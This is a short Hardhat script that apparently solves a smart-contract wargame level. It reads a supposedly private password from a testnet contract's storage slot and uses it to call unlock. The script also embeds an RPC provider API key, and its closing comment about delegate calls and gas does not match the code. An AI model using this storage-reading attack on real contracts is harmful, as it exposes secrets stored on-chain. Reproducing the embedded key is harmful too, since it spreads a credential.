import { ethers } from "hardhat";
// import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/8.Vault/Vault.sol/Vault.json";
import { Contract } from "ethers";

function setTargetContract() {
  const contractAddress = "0x051aCcE2EBDB5a96a1EF2de1b608bde49a6F5Dd0";
  return new Contract(contractAddress, abi);
}

async function main() {
  const [attacker] = await ethers.getSigners();
  const provider = new ethers.providers.JsonRpcProvider(
    "https://eth-rinkeby.alchemyapi.io/v2/TMfNFHkOWc5WIHWdkvGGWlmALUJmSW1v"
  );
  const password = await provider.getStorageAt(
    "0x051aCcE2EBDB5a96a1EF2de1b608bde49a6F5Dd0",
    "0x1"
  );
  const target = setTargetContract();

  const tx = await target.connect(attacker).unlock(password);
  await tx.wait();

  const locked = await target.connect(attacker).locked();
  console.log("Success: ", !locked);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation :
gasLimit must be set manually because ethers has difficulties evaluating gas cost 
when using delegate call.
+ in the delegate contract there is a piece of code that might increase gas costs

*/
// 412076657279207374726f6e67207365637265742070617373776f7264203a29
